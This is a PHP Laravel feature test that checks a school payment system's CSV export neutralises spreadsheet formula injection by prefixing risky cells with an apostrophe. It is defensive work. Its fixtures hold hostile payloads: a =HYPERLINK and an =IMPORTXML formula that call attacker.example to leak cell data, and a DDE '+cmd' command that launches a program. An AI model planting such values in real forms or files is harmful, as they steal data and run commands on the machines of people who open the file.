<?php

namespace Tests\Feature;

use App\Models\Transaction;
use App\Support\CsvCell;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\Concerns\InteractsWithSchools;
use Tests\TestCase;

/**
 * M3: payer and student text from the public payment form reached the school's
 * CSV export verbatim, so a payer named "=HYPERLINK(…)" ran as a formula when
 * the school opened the file. Formula-looking cells are now neutralised.
 */
class CsvFormulaInjectionTest extends TestCase
{
    use InteractsWithSchools, RefreshDatabase;

    /** @return array<int, array<int, string>> rows, header first */
    private function exportRows(): array
    {
        $school = \App\Models\School::where('slug', 'alpha')->firstOrFail();
        $csv = $this->actingAsSchoolAdmin($school)->get('/admin/alpha/transactions/export')->assertOk()->streamedContent();
        $csv = preg_replace('/^\xEF\xBB\xBF/', '', $csv);

        return array_map(str_getcsv(...), array_values(array_filter(explode("\n", trim($csv)))));
    }

    private function payment(array $overrides): void
    {
        $school = \App\Models\School::where('slug', 'alpha')->first() ?? $this->makeSchool('Alpha School', 'alpha');
        Transaction::create(array_merge([
            'school_id' => $school->id, 'reference' => 'ref-'.uniqid(), 'amount' => 102.5, 'fee_amount' => 100, 'service_fee' => 2.5,
            'status' => 'success', 'payment_method' => 'card', 'email' => 'payer@example.test', 'name' => 'Ada Parent',
            'paid_at' => now(), 'meta_data' => ['quantity' => 1, 'base_amount' => 100, 'markup_percent' => 2.5, 'markup_amount' => 2.5, 'gross_amount' => 102.5],
        ], $overrides));
    }

    public function test_malicious_payer_and_student_values_are_neutralised(): void
    {
        $this->payment([
            'name' => '=HYPERLINK("https://attacker.example/?x="&A2,"Click")',
            'email' => '@SUM(1+1)@example.test',
            'student_name' => '+cmd|\' /C calc\'!A0',
            'student_admission_number' => '-2+3',
            'student_class' => "\t=1+1",
            'category_name' => "\r=1+1",
            'subcategory_name' => '=IMPORTXML("https://attacker.example","//a")',
        ]);

        [$header, $row] = $this->exportRows();
        $cell = fn (string $column) => $row[array_search($column, $header, true)];

        $this->assertSame('\'=HYPERLINK("https://attacker.example/?x="&A2,"Click")', $cell('Payer Name'));
        $this->assertSame("'@SUM(1+1)@example.test", $cell('Payer Email'));
        $this->assertSame("'+cmd|' /C calc'!A0", $cell('Student'));
        $this->assertSame("'-2+3", $cell('Admission Number'));
        $this->assertSame("'\t=1+1", $cell('Class'));
        $this->assertSame("'\r=1+1", $cell('Category'));
        $this->assertStringStartsWith("'=IMPORTXML", $cell('Fee Type'));

        foreach ($row as $value) {
            $this->assertFalse($value !== '' && in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true), "unneutralised cell: {$value}");
        }
    }

    public function test_ordinary_values_are_exported_unchanged(): void
    {
        $this->payment([
            'name' => "Ngozi O'Brien-Adeyemi", 'email' => 'ngozi@example.test',
            'student_name' => 'Tobi Adeyemi', 'student_admission_number' => 'FGC/2024/031', 'student_class' => 'JSS 2',
            'category_name' => 'School fees', 'subcategory_name' => 'First term tuition',
        ]);

        [$header, $row] = $this->exportRows();
        $cell = fn (string $column) => $row[array_search($column, $header, true)];

        $this->assertSame("Ngozi O'Brien-Adeyemi", $cell('Payer Name'));
        $this->assertSame('FGC/2024/031', $cell('Admission Number'));
        $this->assertSame('100.00', $cell('Fee Amount (NGN)'));
        $this->assertSame('1', $cell('Quantity'));
        $this->assertSame('success', $cell('Status'));
    }

    public function test_the_cell_helper(): void
    {
        foreach (['=1', '+1', '-1', '@a', "\tx", "\rx"] as $bad) {
            $this->assertSame("'".$bad, CsvCell::safe($bad));
        }
        foreach (['Ada', '100.00', 'a=b', ' =1', '', null, 5, 2.5] as $fine) {
            $this->assertSame($fine, CsvCell::safe($fine));
        }
    }
}
